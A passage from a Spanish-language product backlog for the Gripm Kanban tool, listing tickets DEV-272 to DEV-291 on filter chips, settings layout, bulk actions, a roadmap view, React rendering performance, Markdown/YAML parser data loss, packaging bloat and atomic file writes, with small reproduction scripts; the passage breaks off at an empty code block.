- [x] #6 `npm test` y validación de interacciones en verde

---

#### [DEV-272] Chips descartables de filtros activos en FilterBar para dinamizar el filtrado rápido
- **Prioridad**: `medium` | **Tipo**: `feature`

Actualmente, la barra superior `FilterBar.tsx` cuenta con píldoras de acceso rápido rígidas (Tipos y Prioridades fijos). Si un usuario desea filtrar frecuentemente por estados concretos (ej: solo `doing` y `review`) o por un módulo específico (ej: `UI / Layout`), debe abrir repetidamente el popover de filtros avanzados.

En lugar de construir un panel de configuración complejo y pesado para personalizar qué botones se colocan en la barra (lo que generaría sobre-ingeniería), se adopta el estándar de la industria (Linear / GitHub): **materialización dinámica de filtros activos como chips descartables**.

### Objetivos:
1. Toda dimensión aplicada desde el Popover de Filtros Avanzados que no pertenezca a los accesos directos estándar (ej. Estados específicos, Módulo, Asignado, Sprint) se refleja de inmediato en la barra como una píldora activa interactiva (ej: `[Estado: doing ✕]`, `[Módulo: Auth ✕]`).
2. El usuario puede remover cualquier filtro individual con un clic sobre la X del chip sin tener que abrir el popover.
3. El botón general de "Limpiar filtros" sigue reseteando todas las condiciones activas.
4. Diseño responsivo con scroll horizontal suave o colapso elegante en pantallas pequeñas para evitar solapamientos con las estadísticas.

**Criterios de Aceptación:**
- [x] #1 Al aplicar filtros desde AdvancedFiltersPopover (estados, módulos, sprints, releases), estos se renderizan como chips activos en la barra principal
- [x] #2 Cada chip muestra la dimensión, el valor y un botón de descarte individual (✕)
- [x] #3 Hacer clic en la ✕ de un chip elimina ese filtro específico de inmediato y actualiza la vista
- [x] #4 La barra de filtros no genera scroll vertical ni roturas de layout en resoluciones estándar
- [x] #5 Coherencia de accesibilidad y foco para los chips descartables
- [x] #6 Tests unitarios para el estado de filtros y chips

---

#### [DEV-273] Editor de estructura de columnas Kanban horizontal e intuitivo en Settings
- **Prioridad**: `medium` | **Tipo**: `ux`

En `SettingsView.tsx` (sección *Kanban Board > Column Structure & Status Mapping*), las columnas del tablero se configuran dentro de una lista vertical apilada (`space-y-4`).

Esta disposición contradice el modelo mental del usuario: un tablero Kanban se visualiza de izquierda a derecha en columnas horizontales. Actualmente, los botones de reordenamiento tienen flechas hacia arriba y hacia abajo (`ArrowUp` y `ArrowDown`), mientras que sus textos de ayuda indican textualmente `moveColLeft` ("Mover a la izquierda") y `moveColRight` ("Mover a la derecha"). Además, la lista vertical consume una cantidad excesiva de scroll.

### Objetivos:
1. Reestructurar la sección de mapeo de columnas para que se presente como un **mini-tablero horizontal** (`flex flex-row overflow-x-auto gap-4 pb-4`).
2. Cada columna en el editor se representa como una tarjeta esbelta con su título editable, límite WIP, dot de color y los chips de los estados asignados.
3. Los controles de reordenamiento utilizan flechas izquierda y derecha coherentes con la dirección espacial del tablero (`ArrowLeft` / `ArrowRight`).
4. Se preserva y optimiza la interacción de drag & drop para mover chips de estado entre columnas (DEV-053).

**Criterios de Aceptación:**
- [x] #1 El editor de columnas en Settings presenta las columnas dispuestas una al lado de la otra en flujo horizontal
- [x] #2 Contenedor con scroll horizontal limpio sin desbordar el modal ni la página de configuración
- [x] #3 Los botones de reordenar columnas utilizan iconos horizontales de izquierda y derecha alineados con sus tooltips
- [x] #4 Se mantiene la edición de títulos, límites WIP y la transferencia de chips de estado entre columnas
- [x] #5 La interfaz escala correctamente tanto en modo de columnas Ampliada como Simplificada
- [x] #6 `npm test` y validación de guardado de configuración en verde

---

#### [DEV-274] Optimización de densidad para Metodología y Vistas en Settings (1366×768)
- **Prioridad**: `medium` | **Tipo**: `ux`

En `SettingsView.tsx` (pestaña *Workflow & Views*), la sección *Project Work Methodology* despliega tres tarjetas voluminosas con descripciones extensas y badges, seguidas inmediatamente por otras tres tarjetas similares para *Default View Selector*.

En resoluciones de escritorio habituales como 1366×768 (y monitores estándar de laptop), esta distribución consume prácticamente todo el primer pliegue de pantalla (*above the fold*), desplazando hacia abajo las opciones críticas de activación de pestañas y configuración de vistas.

### Objetivos:
1. Reemplazar los bloques masivos de tarjetas por selectores compactos (ej. radio cards de 1 fila o segmented control interactivo con icono, título y badge conciso).
2. Trasladar los textos explicativos extensos a tooltips contextuales o descripciones de una sola línea con jerarquía atenuada.
3. Asegurar que las opciones de *Habilitación de Pestañas* y *Vistas de Trabajo* queden visibles sin requerir scroll excesivo.
4. Mantener la alineación con los principios de densidad de escritorio establecidos en DEV-264.

**Criterios de Aceptación:**
- [x] #1 El selector de Metodología de Trabajo ocupa una altura significativamente menor mediante un diseño horizontal compacto
- [x] #2 El selector de Vista por Defecto utiliza un control segmentado estilizado y no una grilla de tarjetas altas
- [x] #3 A resolución 1366×768, la sección completa de Metodología y Vistas permite visualizar los controles principales en el primer scroll
- [x] #4 Las descripciones de cada metodología siguen accesibles para el usuario (mediante hint o tooltip)
- [x] #5 `npm run audit:ux` y `npm test` pasan sin regresiones

---

#### [DEV-275] Gestión centralizada de módulos y componentes en Settings con asignación múltiple en tareas
- **Prioridad**: `medium` | **Tipo**: `feature`

Actualmente, el campo de módulo en las tareas (`module?: string`) es un string libre con un datalist no gobernado que se alimenta de valores preexistentes en las tarjetas. Esto provoca inconsistencias ortográficas y fragmentación (ej. `"UI"`, `"ui"`, `"Frontend"`, `"Front-end"`). Además, una tarea solo puede apuntar a un único módulo, impidiendo clasificar ítems que atraviesan componentes transversales (ej. un feature que afecta `Frontend` y `API`).

### Objetivos:
1. **Catálogo de Componentes/Módulos en Settings:** Permitir definir, agregar, renombrar y eliminar una lista oficial de módulos o componentes del proyecto en `.gripm/config.json` (`components: string[]` o `modulesList: string[]`).
2. **Asignación Múltiple en Tareas:** Extender el modelo de `BacklogItem` para soportar múltiples módulos (`modules?: string[]`), preservando compatibilidad retroactiva con `module: string`.
3. **Selector ergonómico en ItemModal:** Reemplazar el input simple por un selector multi-chip donde el usuario puede elegir uno o más componentes predefinidos y opcionalmente crear uno nuevo sobre la marcha si cuenta con permisos.
4. **Filtro unificado:** Actualizar los filtros de la barra superior y del popover para filtrar por cualquiera de los módulos asociados.

**Criterios de Aceptación:**
- [x] #1 Existe una sección en Settings para administrar la lista canónica de módulos / componentes del proyecto
- [x] #2 Los componentes administrados se persisten en la configuración del proyecto
- [x] #3 ItemModal permite asignar uno o varios módulos a una tarjeta mediante chips interactivos
- [x] #4 Se mantiene la compatibilidad con tareas históricas que tienen un único string en el campo `module`
- [x] #5 La tarjeta (ItemCard) renderiza los badges de módulos de forma compacta y legible
- [x] #6 El filtro por módulo en FilterBar y AdvancedFiltersPopover soporta búsqueda multi-módulo
- [x] #7 `npm test` y sincronización de backlog con código 0

---

#### [DEV-276] Acciones rápidas de reposicionamiento individual en tarjetas y backlog (Top, Bottom y Asignar Sprint)
- **Prioridad**: `high` | **Tipo**: `feature`

Actualmente, reordenar una tarea dentro de una columna o en la tabla de Backlog depende casi exclusivamente del arrastre con mouse (drag & drop). En `ItemCard.tsx`, el menú contextual solo ofrece subir o bajar una única posición (`canMoveUp` / `canMoveDown`), lo que resulta sumamente tedioso e inviable cuando una columna o backlog contiene decenas de ítems.

Asimismo, asignar una tarea a un sprint específico exige arrastrarla verticalmente por todo el viewport o abrir el modal de edición completo.

### Objetivos:
1. **Mover al Tope / Fondo:** Incorporar en el menú contextual (`...`) de cada tarjeta en el Tablero y en el menú de acciones de cada fila en `SprintView`:
   - *"Mover al principio de la columna / backlog"* (Top rank)
   - *"Mover al final de la columna / backlog"* (Bottom rank)
2. **Asignación Rápida de Sprint:** Agregar un submenú o acción directa *"Asignar a Sprint →"* con listado de sprints vigentes y la opción *"Devolver al Backlog"*, permitiendo transferir la tarea en un solo clic sin abrir el formulario de edición.
3. Actualizar el orden numérico (`order`) de forma consistente para garantizar persistencia determinística en disco.

**Criterios de Aceptación:**
- [x] #1 El menú contextual de la tarjeta en KanbanBoard incluye acciones para mover al tope y al fondo de su columna
- [x] #2 Cada fila en SprintView incluye menú o botones de acción para mover el ítem al tope o fondo de su contenedor (sprint o backlog)
- [x] #3 Se provee acción contextual para mover rápidamente el ítem a cualquier sprint activo/vigente o al backlog general
- [x] #4 El recálculo del campo `order` mantiene la estabilidad de ranking sin solapamientos
- [x] #5 Accesibilidad por teclado en las nuevas opciones de menú
- [x] #6 `npm test` y verificación de consistencia en verde

---

#### [DEV-277] Selección múltiple en Backlog y barra de acciones masivas con reposicionamiento en lote
- **Prioridad**: `high` | **Tipo**: `feature`

En la vista de Backlog y Sprints (`SprintView.tsx`), gestionar múltiples tareas simultáneamente no es posible desde la interfaz web. Los usuarios deben modificar o arrastrar tareas una por una, lo que ralentiza enormemente las ceremonias de Sprint Planning, priorización y ordenamiento de backlog.

Esta tarea implementa **selección múltiple de ítems** y una **barra flotante de acciones masivas (*Bulk Action Bar*)**, incorporando además la capacidad de **mover múltiples ítems seleccionados al tope o al fondo del backlog/sprint en un solo movimiento en lote**.

### Objetivos:
1. **Mecanismo de Selección Múltiple:**
   - Checkboxes de selección por fila en la tabla de `SprintView`.
   - Checkbox "Seleccionar todos" en el encabezado de cada sección (Sprint o Backlog).
   - Soporte para selección de rango contiguo mediante `Shift + Click`.
2. **Barra Flotante de Acciones Masivas (Bulk Action Bar):**
   - Aparece en la parte inferior de la pantalla al seleccionar $\ge 1$ ítem, indicando el contador de tareas seleccionadas y botón de deseleccionar.
   - **Reposicionamiento en lote:** Botones para *"Mover selección al tope"* (Bulk Top) y *"Mover selección al fondo"* (Bulk Bottom) conservando el orden relativo entre los ítems seleccionados.
   - **Asignación de Sprint en lote:** Mover todos los ítems seleccionados a un sprint vigente o devolverlos al backlog.
   - **Asignación de Release en lote:** Vincular la selección a una versión planificada.
   - **Cambio de Estado y Prioridad en lote:** Modificar estado (ej. pasar todos a `ready` o `draft`) o prioridad (ej. `p1`).
   - **Mover a Papelera en lote:** Descarte masivo protegido con diálogo de confirmación `ConfirmModal`.
3. Conectar la ejecución con el motor de mutaciones masivas existente o las rutas de API correspondientes.

**Criterios de Aceptación:**
- [x] #1 SprintView incluye checkboxes de selección por fila y en la cabecera de cada bloque de sprint/backlog
- [x] #2 Permite selección rápida de rangos de tareas contiguas manteniendo pulsada la tecla Shift
- [x] #3 Al seleccionar uno o más ítems se despliega una barra flotante inferior con el contador y las acciones masivas disponibles
- [x] #4 Acción masiva para mover todos los ítems seleccionados al tope o al fondo del contenedor preservando su orden relativo
- [x] #5 Acciones masivas para asignar sprint, asignar release, cambiar estado y cambiar prioridad en un solo paso
- [x] #6 Acción para mover masivamente a la papelera con diálogo de confirmación claro y seguro
- [x] #7 `npm test` y consistencia de datos en disco sin race conditions

---

#### [DEV-278] Ajuste en Settings para alternar visibilidad del resumen de métricas en FilterBar
- **Prioridad**: `low` | **Tipo**: `improvement`

En `FilterBar.tsx`, el indicador de resumen de métricas (`2 pendientes • 2 en curso • 3 completados • 7 total`) se renderiza siempre de forma obligatoria en el extremo derecho de la barra.

En pantallas medianas o portátiles, esta cadena de texto compite directamente por el ancho horizontal con los filtros de búsqueda y píldoras rápidas, provocando potenciales solapamientos o wrapping no deseado. Además, usuarios que prefieren interfaces limpias o minimalistas no disponen de un mecanismo para ocultar este resumen.

### Objetivos:
1. Agregar una propiedad en la configuración (`config.ui.showFilterBarStats` o `config.showFilterBarStats`, por defecto `true`).
2. Incorporar un switch en `SettingsView.tsx` (sección Apariencia / Filtros) para encender o apagar este bloque.
3. Respetar la preferencia en `FilterBar.tsx`, ocultando el componente cuando el usuario lo desactive y liberando espacio horizontal completo para los filtros.

**Criterios de Aceptación:**
- [x] #1 SettingsView incluye un switch para encender o apagar el resumen de estadísticas de la barra de filtros
- [x] #2 La preferencia se persiste correctamente en la configuración del proyecto
- [x] #3 Cuando el switch está desactivado, FilterBar no renderiza el bloque de métricas a la derecha
- [x] #4 En modo activo, el bloque de estadísticas se muestra con su formato y separadores habituales
- [x] #5 `npm test` y consistencia de esquemas de configuración en verde

---

#### [DEV-279] Internacionalización (i18n) de plantillas BDD para Historias de Usuario y Criterios de Aceptación
- **Prioridad**: `medium` | **Tipo**: `bug`

En `src/components/ItemModal.tsx`, las plantillas predefinidas que se insertan al presionar los botones de ayuda de BDD se encuentran hardcodeadas en español:

1. **Plantilla de Historia de Usuario (línea 728):**
   ```ts
   const bddTemplate = `\n\n**COMO** [rol del usuario]\n**QUIERO** [capacidad o acción]\n**PARA** [beneficio o valor de negocio]\n`;
   ```
2. **Criterio de Aceptación BDD (línea 797):**
   ```ts
   text: 'DADO [contexto inicial], CUANDO [evento o acción], ENTONCES [resultado esperado]'
   ```

Cuando la aplicación está configurada en inglés (`config.language = 'en'`), presionar estos botones sigue insertando texto literal en español en lugar de los equivalentes canónicos en inglés (`AS A... I WANT... SO THAT...` y `GIVEN... WHEN... THEN...`).

### Objetivos:
1. Extraer los textos y plantillas de BDD al catálogo de traducciones `src/utils/i18n.ts`.
2. Proporcionar las versiones canónicas en inglés:
   - Story: `**AS A** [user role]\n**I WANT** [action or capability]\n**SO THAT** [business value or benefit]\n`
   - AC Scenario: `GIVEN [initial context], WHEN [event or action], THEN [expected outcome]`
3. Mantener las versiones canónicas en español en `t(...)`.
4. Asegurar que la inserción respete el idioma activo del usuario en la sesión.

**Criterios de Aceptación:**
- [x] #1 Al insertar plantilla de Historia de Usuario con la app en inglés, se genera el formato `**AS A** / **I WANT** / **SO THAT**`
- [x] #2 Al insertar plantilla de Historia de Usuario con la app en español, se genera el formato `**COMO** / **QUIERO** / **PARA**`
- [x] #3 Al agregar Criterio de Aceptación BDD con la app en inglés, el texto predeterminado es `GIVEN ..., WHEN ..., THEN ...`
- [x] #4 Al agregar Criterio de Aceptación BDD con la app en español, el texto predeterminado es `DADO ..., CUANDO ..., ENTONCES ...`
- [x] #5 `npm test` y validación de tipos sin errores

---

#### [DEV-280] Restricción de candidatos a Parent (Epics/Iniciativas) y selector con búsqueda en ItemModal
- **Prioridad**: `medium` | **Tipo**: `ux`

En el modal de edición de tareas (`ItemModal.tsx`), la selección del ítem contenedor o padre (`parentId`) presenta dos problemas graves de usabilidad:

1. **Contaminación del listado:** La definición de candidatos a padre (`line 196`) incluye ítems de tipo `feature`:
   ```ts
   const candidateParents = otherItems.filter(it => it.type === 'epic' || it.type === 'initiative' || it.type === 'feature');
   ```
   En cualquier proyecto mediano o grande, esto inunda el selector con cientos de tareas individuales que no son contenedores legítimos de jerarquía.
2. **Falta de buscador:** El control es un elemento `<select>` plano de HTML nativo (`lines 1860-1880`). Si un usuario tiene 30 épicas o no recuerda el ID exacto (`DEV-140`), se ve obligado a hacer scroll visual extenso sin capacidad de filtrar por nombre o palabra clave.

### Objetivos:
1. **Restricción canónica:** Filtrar `candidateParents` estrictamente por `it.type === 'epic' || it.type === 'initiative'` (contenedores jerárquicos reales).
2. **Combobox / Popover con Buscador en vivo:** Reemplazar el `<select>` plano por un componente de selección accesible con input de búsqueda integrado, permitiendo escribir parte del título o del código para filtrar instantáneamente la lista de épicas.
3. Mostrar claramente el tipo (`[EPIC]` o `[INITIATIVE]`), el código y el título completo en el desplegable.
4. Mantener la opción de desvincular el padre de forma clara e inmediata.

**Criterios de Aceptación:**
- [x] #1 El listado de candidatos a Parent en ItemModal solo muestra tareas de tipo `epic` e `initiative`
- [x] #2 Las tareas regulares de tipo `feature`, `bug`, `ux`, etc., quedan excluidas de la lista de posibles padres
- [x] #3 El selector cuenta con un buscador en tiempo real para filtrar candidatos por código o título
- [x] #4 Seleccionar una épica actualiza inmediatamente el campo `parentId` y muestra la referencia vinculada
- [x] #5 La interfaz permite limpiar la relación de forma rápida con el botón de desvinculación
- [x] #6 `npm test` y consistencia en la jerarquía de ítems

---

#### [DEV-281] Épica: Vista interactiva de Timeline y Roadmap con agrupación jerárquica y fechas
- **Prioridad**: `medium` | **Tipo**: `feature`

Iniciativa de producto para dotar a Gripm de una vista visual de **Timeline / Roadmap (Gantt-style)**, orientada al planeamiento estratégico, seguimiento de compromisos temporales y comunicación con stakeholders.

Actualmente, Gripm carece de un modelo de fechas de inicio y fin en las tareas individuales (`BacklogItem`), y la visualización temporal se limita a las fechas fijadas en Sprints y Releases.

### Alcance propuesto por fases:

#### Fase 1: Extensión del Modelo de Datos y Fechas
1. Incorporar campos opcionales `startDate?: string` y `dueDate?: string` en `BacklogItem` (`src/types.ts`) y serialización transparente en frontmatter Markdown.
2. Permitir que una tarea herede fechas estimadas automáticamente del Sprint asignado (`startDate` / `endDate`) o de la Release (`targetDate`) si no tiene fechas explícitas.

#### Fase 2: Vista de Roadmap y Agrupación por Parent (Solo Lectura / Render)
1. Nueva pestaña o submódulo de navegación: **Roadmap / Timeline**.
2. Agrupación por jerarquía: Las Épicas e Iniciativas actúan como filas principales colapsables/desplegables que contienen sus tareas hijas (`parentId`).
3. Escalas de tiempo dinámicas (zoom por Trimestre / Q1-Q4, Meses y Sprints).
4. Barras visuales con código de color según estado (`draft`, `doing`, `ready`, `done`) y porcentaje de progreso.

#### Fase 3: Interactividad y Planificación Directa
1. Capacidad de arrastrar barras para desplazar fechas o extender/reducir plazos temporales.
2. Renderizado de líneas de dependencia horizontal (`blocks` / `blockedBy`).

**Criterios de Aceptación:**
- [x] #1 Especificación y diseño de arquitectura para el soporte de fechas (startDate/dueDate) en BacklogItem
- [x] #2 Naming canónico de producto como "Roadmap" en cabecera, navegación, settings y catálogos de traducción (EN/ES)
- [x] #3 Capacidad de alternar escalas de tiempo (Trimestres, Meses, Sprints) con reestructuración real de la cuadrícula y de los slots de tiempo
- [x] #4 Panel de jerarquía lateral con divisor redimensionable manualmente (splitter drag con cursor col-resize y memoria de ancho)
- [x] #5 Jerarquía parent-child explícita con líneas guía de árbol en L e indentación clara para tareas dependientes bajo sus Épicas
- [x] #6 Drag & Drop interactivo de bloques temporales: recálculo dinámico de fechas en Meses/Trimestres y reasignación directa de Sprint en escala de Sprints (validando que el sprint no esté completado)
- [x] #7 Redimensionamiento temporal directo mediante handles en los extremos de las barras (inicio y fin)
- [x] #8 Acabado visual de calibre mundial estilo Linear/Jira (cero aspecto de juguete), con indicador de Hoy, tooltips flotantes en vivo y barras de alto contraste
- [x] #9 Preservación de la Pirámide de Verificación (18/18 tests en verde, 0 errores TypeScript, 0 findings UX-011)

---

#### [DEV-282] Optimización de renderizado en Kanban: callbacks estables, listener condicional y lookup O(1)
- **Prioridad**: `high` | **Tipo**: `tech_debt`

Optimización del rendimiento en tiempo de ejecución del tablero Kanban ([src/components/KanbanBoard.tsx](file:///c:/Users/Pablo/Proyectos/gripm/src/components/KanbanBoard.tsx) e [src/components/ItemCard.tsx](file:///c:/Users/Pablo/Proyectos/gripm/src/components/ItemCard.tsx)) para eliminar caídas de frames y lag de interacción cuando el backlog acumula más de 100-250 tareas.

### Problemas identificados:
1. **Invalidación de `React.memo` por callbacks anónimos:** En `KanbanBoard.tsx`, cada tarjeta recibe props con funciones anónimas inline (`onClick={() => onClickItem(item)}`, `onUpdateStatus={(id, s) => onUpdateStatus(id, s)}`). Esto invalida `React.memo(ItemCard)` y causa que las 278 tarjetas re-rendericen completamente ante cualquier cambio de filtro, tipeo en búsqueda o actualización de estado.
2. **Fuga y saturación de event listeners globales:** Cada tarjeta montada registra un listener permanente `document.addEventListener('mousedown', handleClickOutside)` en su `useEffect`, sin importar si su menú contextual está abierto o cerrado. Con más de 200 tarjetas, cada clic en el documento activa más de 200 handlers simultáneos.
3. **Búsqueda cuadrática $O(N^2)$ por render:** Dentro de `ItemCard`, la búsqueda de la tarea padre ejecuta `allItems.find(...)`, provocando decenas de miles de comparaciones redundantes en cada ciclo de render.
4. **Modales no condicionales en el árbol virtual:** Cada tarjeta instancia un `<ConfirmModal isOpen={showDeleteConfirm} ... />` de forma permanente, agregando hooks, estado y refs innecesarios por tarjeta.

### Solución propuesta:
- Estabilizar callbacks con `useCallback` en el contenedor Kanban o delegar acciones por ID.
- Activar el listener de `mousedown` en `ItemCard` exclusivamente cuando `menuOpen === true`.
- Pre-calcular un `Map<string, BacklogItem>` en el contenedor padre para resolución $O(1)$ de tareas padre.
- Condicionalizar el montaje de `ConfirmModal` (`{showDeleteConfirm && <ConfirmModal ... />}`).

**Criterios de Aceptación:**
- [x] #1 Los callbacks pasados a `ItemCard` (`onClick`, `onUpdateStatus`, `onDelete`) preservan referencias estables para que `React.memo` evite re-renders innecesarios
- [x] #2 El listener global `mousedown` de click-outside en `ItemCard` solo se registra en `document` cuando el menú contextual está activo (`menuOpen === true`)
- [x] #3 La búsqueda de la tarea padre (`parentItem`) se resuelve en $O(1)$ mediante una tabla hash/Map pre-indexada
- [x] #4 `ConfirmModal` en `ItemCard` se monta condicionalmente solo cuando la confirmación es solicitada
- [x] #5 La suite de pruebas y typechecking aprueban limpiamente (`npm test` y `npx tsc --noEmit`)

---

#### [DEV-287] Refinamiento de etiqueta de filtro de estados: 'Estados activos' / 'Active statuses' para eliminar ambigüedad
- **Prioridad**: `low` | **Tipo**: `ux`

En la barra de filtros y en el menú desplegable `AdvancedFiltersPopover.tsx`, la selección rápida de los estados activos del flujo de trabajo se rotula actualmente como "Todos los estados" / "All statuses" (`filter.allActiveFlow`).

Esta etiqueta presenta una ambigüedad semántica: el usuario puede inferir razonablemente que incluye también estados terminales como `done` (completados), `cancelled` o `dismissed`. 

Al delimitar explícitamente el alcance como estados "activos" (WIP / flujo en curso):
1. Se elimina la falsa expectativa de ver tareas completadas o canceladas.
2. Se adopta la convención estándar de la industria (Linear, Jira) donde los filtros de ciclo vivo se designan canónicamente:
   - Español: "Estados activos" (o "Todos los estados activos").
   - Inglés: "Active statuses" (o "All active statuses").
3. Se preserva la economía visual y el espacio horizontal en el chip de cabecera y en el dropdown de filtros avanzados.

**Criterios de Aceptación:**
- [x] #1 Actualizar el catálogo de idioma español (`src/locales/es.json`) en `filter.allActiveFlow` a "Estados activos"
- [x] #2 Actualizar el catálogo de idioma inglés (`src/locales/en.json`) en `filter.allActiveFlow` a "Active statuses"
- [x] #3 Validar que el chip en FilterBar y la opción en AdvancedFiltersPopover rendericen la nueva etiqueta con economía espacial
- [x] #4 Verificar tipado estricto (`npx tsc --noEmit`) y ejecución limpia de la suite de pruebas

---

#### [DEV-288] Visibilidad de la versión de la aplicación en el pie del modal de atajos en Modo Sandbox
- **Prioridad**: `low` | **Tipo**: `bug`

En el pie del modal de ayuda de atajos de teclado (`KeyboardShortcutsModal.tsx`), la marca `gripm` muestra la versión activa de la aplicación mediante la expresión:
`gripm{updateAvailable?.currentVersion ? ' v' + updateAvailable.currentVersion : ''}`

En entornos locales con el backend daemon activo, `updateAvailable` se resuelve a través del sondeo de `/api/updates`. Sin embargo, en el **Modo Sandbox interactivo** (deploy estático en Vercel sin servidor Node.js), `/api/updates` no responde, por lo que `updateAvailable` permanece como `null` y la versión nunca se visualiza (quedando solo el texto "gripm").

### Solución propuesta:
1. Inyectar o disponer la versión estática de la aplicación en tiempo de compilación mediante `__APP_VERSION__` (vía `vite.config.ts` `define`) o constante importada del paquete.
2. Utilizar `__APP_VERSION__` como valor canónico o fallback directo cuando `updateAvailable?.currentVersion` no esté definido:
   `const displayVersion = updateAvailable?.currentVersion || APP_VERSION;`
3. Garantizar que tanto en Modo Local como en Modo Sandbox (Vercel) el pie del modal renderice siempre `gripm vX.Y.Z` de forma consistente.

**Criterios de Aceptación:**
- [x] #1 Proveer una constante de versión estática (`APP_VERSION` o `__APP_VERSION__`) disponible en el bundle frontend
- [x] #2 Renderizar la versión en el pie de `KeyboardShortcutsModal.tsx` tanto con daemon local como en Modo Sandbox
- [x] #3 Validar en entorno sandbox que el texto muestre `gripm v<version>` y no solo `gripm`
- [x] #4 Verificar tipado estricto (`npx tsc --noEmit`) y suite de pruebas en verde

---

#### [DEV-289] Integridad del Parser: Eliminación de mutilación de código y pérdida de campos YAML en backlogMdParser
- **Prioridad**: `urgent` | **Tipo**: `bug`

Corrección crítica en `scripts/backlogMdParser.ts` para evitar la pérdida silenciosa de datos y la mutilación de texto Markdown al guardar tareas desde la UI Web o el servidor MCP.

### Problemas identificados y reproducibles:

1. **Pérdida silenciosa de campos YAML personalizados:**
   En `scripts/backlogMdParser.ts:247-266`, la función `finalizeList()` solo procesa una lista fija de claves (`labels`, `assignees`, `dependencies`, `blocks`, `blocked_by`, `related_to`, `sprints`, `releases`). Cualquier otra clave YAML en formato de lista (ej: `tags:`, `reviewers:`, `qa_steps:`) se descarta de la memoria y **se elimina físicamente del archivo en disco al serializar**.
2. **Rotura de listas inline con comas:**
   En `scripts/backlogMdParser.ts:301`, listas como `labels: ["ui/ux", "auth, login"]` se parten con `.split(',')`, corrompiendo los valores.
3. **Mutilación de descripciones con bloques de código Markdown:**
   En `scripts/backlogMdParser.ts:202-213`, `extractSectionBlock()` busca delimitadores H2 (`## Acceptance Criteria`, `## Description`) mediante expresiones regulares ignorando bloques de código cercados (```markdown ... ```). Si una tarea contiene documentación técnica o ejemplos con encabezados H2 dentro de código, el parser corta la sección en el bloque de código y **borra todo el texto posterior al re-serializar**.

### Script de Reproducción Inmediata (PoC):

```javascript
import { parseBacklogMd, serializeBacklogMd } from './scripts/backlogMdParser.ts';

// Caso 1: Pérdida de campos YAML
const md1 = `---\nid: DEV-999\ntags:\n  - security\nreviewers:\n  - alice\n---\n## Description\nTest.`;
const p1 = parseBacklogMd(md1, 'DEV-999');
const s1 = serializeBacklogMd(p1);
console.assert(s1.includes('reviewers'), 'FALLO: reviewers fue eliminado del archivo');

// Caso 2: Truncamiento por código
const md2 = `## Description\n\`\`\`markdown\n## Acceptance Criteria\n- [ ] en código\n\`\`\`\nTexto que se borra.`;
const p2 = parseBacklogMd(md2, 'DEV-999');
console.assert(p2.description.includes('Texto que se borra'), 'FALLO: Texto posterior al código fue truncado');
```

**Criterios de Aceptación:**
- [x] #1 `parseBacklogMd` y `serializeBacklogMd` preservan cualquier campo o lista YAML no estándar dentro de `rawExtraFrontmatter` sin pérdida de datos en el ciclo de lectura y serialización
- [x] #2 Los valores de listas inline entre corchetes con comas entrecomilladas (`["a", "b, c"]`) se analizan respetando las cadenas sin dividirlas erróneamente
- [x] #3 `extractSectionBlock` ignora cualquier encabezado H2 (`## ...`) que se encuentre dentro de bloques de código cercados (\`\`\` o ~~~), extrayendo la totalidad de la descripción y el plan
- [x] #4 Un test de ida y vuelta (round-trip) verifica que tareas con bloques de código y metadatos YAML complejos conservan el 100% de su contenido
- [x] #5 La suite de pruebas de sincronización aprueba limpiamente (`npm run backlog:check`)

---

#### [DEV-290] Desacople de Vite en Runtime: Servidor estático para producción y reducción de dependencias
- **Prioridad**: `urgent` | **Tipo**: `architecture`

Desacoplamiento del servidor de desarrollo de Vite del comando ejecutable de producción `bin/gripm.js` para que sirva los activos precompilados de `dist/` en lugar de compilar en caliente TypeScript y procesar CSS con PostCSS/Tailwind en la máquina del usuario final.

### Problemas identificados y reproducibles:

1. **Dev Server en Producción:**
   En `bin/gripm.js:357-375`, `gripm` ejecuta `createServer()` de Vite apuntando a `vite.config.ts`. El bundle productivo `dist/` generado por `npm run build` nunca se sirve.
2. **Dependencias infladas en producción (Bloat):**
   Para que `bin/gripm.js` funcione, `package.json` declara en `dependencies`: `vite`, `@vitejs/plugin-react`, `tailwindcss`, `postcss`, `autoprefixer`, `react`, `react-dom`, `lucide-react`. Esto fuerza una descarga de más de 120 MB en `npm install -g @gripm/board`.
3. **Incompatibilidad de motores Node:**
   `package.json` declara `"engines": { "node": ">=20.0.0" }`, pero los scripts usan `--experimental-strip-types` (requiere `>=22.6.0`). En Node 20 LTS, `npm test` o `npm run tasks` aborta con `bad option: --experimental-strip-types`.

### Script de Reproducción Inmediata (PoC):

```bash
# Simular instalación limpia sin devDependencies en Node 20
npm pack
mkdir -p /tmp/gripm-clean && cd /tmp/gripm-clean
npm install --omit=dev /path/to/gripm-board-*.tgz
# En el estado actual, el paquete arrastra vite y esbuild (~130MB)
npx @gripm/board --version
```

**Criterios de Aceptación:**
- [x] #1 `bin/gripm.js` en modo producción sirve la interfaz compilada desde `dist/` utilizando un servidor estático minimalista (o módulo HTTP nativo de Node), sin invocar `createServer()` de Vite
- [x] #2 `vite`, `@vitejs/plugin-react`, `tailwindcss`, `postcss` y `autoprefixer` se mueven de `dependencies` a `devDependencies` en `package.json`
- [x] #3 La huella de instalación en `node_modules` para una instalación de producción (`npm install --omit=dev`) se reduce de más de 120 MB a menos de 10 MB
- [x] #4 El campo `engines.node` en `package.json` y la ejecución de scripts se unifican de forma compatible con la versión mínima declarada
- [x] #5 La suite de pruebas de empaquetado y superficie de publicación aprueban limpiamente (`npm run publish:check` y `npm run verify:dist`)

---

#### [DEV-291] Persistencia Atómica: Erradicación de truncamiento a cero bytes en tareas y registry
- **Prioridad**: `urgent` | **Tipo**: `bug`

Reemplazo sistemático de llamadas directas a `fs.writeFileSync()` por una función de escritura atómica (`write to temp file` + `fs.fsync` + `fs.renameSync`) en toda la capa de almacenamiento del backend y configuración global para prevenir la pérdida irreversible de tareas y corrupción de datos ante interrupciones de proceso.

### Problemas identificados y reproducibles:

1. **Truncamiento instantáneo a 0 bytes:**
   En `server/services/storage.ts:660`, `storage.ts:787` y `scripts/registryConfig.js:66`, los archivos se sobrescriben directamente con `fs.writeFileSync(path, content)`.
   `fs.writeFileSync` con la bandera por defecto `'w'` trunca el archivo a 0 bytes inmediatamente al abrir el descriptor.
2. **Corrupción irreversible ante interrupción:**
   Si el proceso de Node.js se cancela bruscamente (Ctrl+C, desconexión de terminal, fallo del sistema, OOM Killer o excepción no capturada) durante la escritura, el archivo de la tarea o `~/.gripm/registry.json` queda vacío (0 bytes).
3. **Reseteo catastrófico de registry:**
   En `scripts/registryConfig.js:48`, si `registry.json` queda corrupto o vacío por un truncamiento, el bloque `catch` descarta el archivo y devuelve `{ activeProjectId: '', projects: [] }`, borrando todo el historial de proyectos en el siguiente guardado.

### Script de Reproducción Inmediata (PoC):

```javascript
